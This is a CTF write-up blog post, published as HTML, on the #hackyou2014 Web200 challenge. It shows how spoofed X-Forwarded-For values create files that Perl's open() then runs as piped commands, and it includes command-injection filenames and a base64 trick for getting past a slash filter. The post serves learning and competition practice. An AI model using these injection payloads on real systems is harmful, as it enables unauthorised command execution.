@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>#hackyou2014 Web200 write-up</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  
+  
+
+  
+
+  
+  <meta name="author" content="pwntester">
+  <meta name="description" content="In this level we are presented with a typical Snake game.
+I spent a couple of hours deofuscating the javascript code until I was capable of submitting any score. Nice but useless. I also found out that I could fake the IP associated to the score using the X-Forwarded-For header. That was pretty much it until the CTF was about to finish when I was given the hint: &amp;ldquo;../&amp;rdquo;. I could use it to locate a LFI vulnerability that was affecting the index.">
+
+  
+  
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@pwntester">
+    <meta name="twitter:title" content="#hackyou2014 Web200 write-up">
+    <meta name="twitter:description" content="In this level we are presented with a typical Snake game.
+I spent a couple of hours deofuscating the javascript code until I was capable of submitting any score. Nice but useless. I also found out that I could fake the IP associated to the score using the X-Forwarded-For header. That was pretty much it until the CTF was about to finish when I was given the hint: &amp;ldquo;../&amp;rdquo;. I could use it to locate a LFI vulnerability that was affecting the index.">
+    <meta name="twitter:image" content="/images/avatar.jpeg">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="#hackyou2014 Web200 write-up">
+  <meta property="og:description" content="In this level we are presented with a typical Snake game.
+I spent a couple of hours deofuscating the javascript code until I was capable of submitting any score. Nice but useless. I also found out that I could fake the IP associated to the score using the X-Forwarded-For header. That was pretty much it until the CTF was about to finish when I was given the hint: &amp;ldquo;../&amp;rdquo;. I could use it to locate a LFI vulnerability that was affecting the index.">
+  <meta property="og:url" content="http://pwntester.com/blog/2014/01/15/hackyou2014-web200-write-up/">
+  <meta property="og:image" content="/images/avatar.jpeg">
+
+
+
+
+<meta name="generator" content="Hugo 0.59.0">
+
+
+<link rel="canonical" href="http://pwntester.com/blog/2014/01/15/hackyou2014-web200-write-up/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="&lt;/pwntester&gt;">
+<meta name="msapplication-tooltip" content="&lt;/pwntester&gt;">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.jpeg" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: #22313F;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href="http://pwntester.com/"><img class="avatar" src="/images/avatar.jpeg" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="http://pwntester.com/">&lt;/pwntester&gt;</a></h2>
+  
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/post">Blog</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="https://github.com/pwntester">Works</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="mailto:alvaro@pwntester.com" title="Email" aria-label="Email">
+            <span class="icon icon-email" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//github.com/pwntester" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//twitter.com/pwntester" rel="me" title="Twitter" aria-label="Twitter">
+            <span class="icon icon-twitter" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/alvaroms" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">#hackyou2014 Web200 write-up</h1>
+      <p class="post-meta">@pwntester · Jan 15, 2014 · 2 min read</p>
+    </header>
+    <article class="post-content"><p>In this <a href="http://hackyou2014tasks.ctf.su:20080/">level</a> we are presented with a typical Snake game.</p>
+
+<p><img src="/images/octopress/snake.png" alt="" /></p>
+
+<p>I spent a couple of hours deofuscating the javascript code until I was capable of submitting any score. Nice but useless. I also found out that I could fake the IP associated to the score using the <strong>X-Forwarded-For</strong> header.
+That was pretty much it until the CTF was about to finish when I was given the hint: &ldquo;../&rdquo;. I could use it to locate a LFI vulnerability that was affecting the <strong>index.php?ip</strong> parameter so I was capable of reading <strong>index.pl</strong>:</p>
+
+<p><img src="/images/octopress/indexpl.png" alt="" /></p>
+
+<p>Reviewing the code we spot the LFI in line 4:</p>
+
+<pre><code class="language-lang-bash">$login = $session-&gt;param('login');
+print $req-&gt;p('Hello, '.$login.'!');
+if ($req-&gt;param('ip')) {
+    $file = './data/'.MD5($login).&quot;/&quot;.$req-&gt;param('ip');
+    if (-e $file) {
+        open FILE, $file;
+        $html = '';
+        while (&lt;FILE&gt;) {
+            $html .= $_;
+        }
+        close(FILE);
+        print $req-&gt;start_table({border=&gt;1});
+        print $req-&gt;Tr($req-&gt;th(['Date', 'Score']));
+        print $html;
+        print $req-&gt;end_table();
+        print $req-&gt;a({href=&gt;'index.pl'}, 'Back');
+    } else {
+        print $req-&gt;h1('Error');
+    }
+}
+</code></pre>
+
+<p>But also there is another interesting &ldquo;feature&rdquo; if $file exists then it will be opened and since perl <strong>open()</strong> command in line 6 allow us to inject commands using pipes, we can execute any arbitrary command. Problem is that $file needs to exist so how can we create a random file there? Well, we can use our ability to submit random IPs with <strong>X-Forwarded-For</strong>:</p>
+
+<p><img src="/images/octopress/web200-1.png" alt="" /></p>
+
+<p>Now if we go to index.pl?ip=|pwd| we will get:</p>
+
+<p><img src="/images/octopress/web200-2.png" alt="" /></p>
+
+<p>Nice! However we cannot create files containing a slash (&ldquo;/&rdquo;):</p>
+
+<pre><code class="language-lang-bash">fusion@fusion:~/test$ perl -e 'open(FILE, &quot;&gt;&gt;&quot;, &quot;./&quot;.&quot;|pwd|&quot;)'
+fusion@fusion:~/test$ perl -e 'open(FILE, &quot;&gt;&gt;&quot;, &quot;./&quot;.&quot;|ls .|&quot;)'
+fusion@fusion:~/test$ perl -e 'open(FILE, &quot;&gt;&gt;&quot;, &quot;./&quot;.&quot;|ls ..|&quot;)'
+fusion@fusion:~/test$ perl -e 'open(FILE, &quot;&gt;&gt;&quot;, &quot;./&quot;.&quot;|ls /|&quot;)'
+fusion@fusion:~/test$ ls
+|ls ..|  |ls .|  |pwd|
+</code></pre>
+
+<p>No backslashes neither:</p>
+
+<pre><code class="language-lang-bash">fusion@fusion:~/test$ perl -e 'open(FILE, &quot;&gt;&gt;&quot;, &quot;./&quot;.&quot;|`echo -e '\x6c\x73\x20\x2f'`|&quot;)'
+fusion@fusion:~/test$ ls
+|`echo -e x6cx73x20x2f`|  |ls ..|  |ls .|  |pwd|
+</code></pre>
+
+<p>Lets try base64:</p>
+
+<pre><code class="language-lang-bash">fusion@fusion:~/test$ perl -e 'open(FILE, &quot;&gt;&gt;&quot;, &quot;./&quot;.&quot;|`echo bHMgLw== | base64 -d`|&quot;)'
+fusion@fusion:~/test$ ls
+|`echo -e x6cx73x20x2f`|  |`echo bHMgLw== | base64 -d`|  |ls ..|  |ls .|  |pwd|
+</code></pre>
+
+<p>Cool! lets submit it:</p>
+
+<p><img src="/images/octopress/web200-3.png" alt="" /></p>
+
+<p>And fetch our recompense:</p>
+
+<p><img src="/images/octopress/web200-4.png" alt="" /></p>
+</article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/ctf"><span class="tag">CTF</span></a></li>
+        
+          <li><a href="/tags/web"><span class="tag">Web</span></a></li>
+        
+          <li><a href="/tags/php"><span class="tag">PHP</span></a></li>
+        
+          <li><a href="/tags/hackyou2014"><span class="tag">HackYou2014</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        This post was published <strong>2107</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2019 &lt;/pwntester&gt;</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
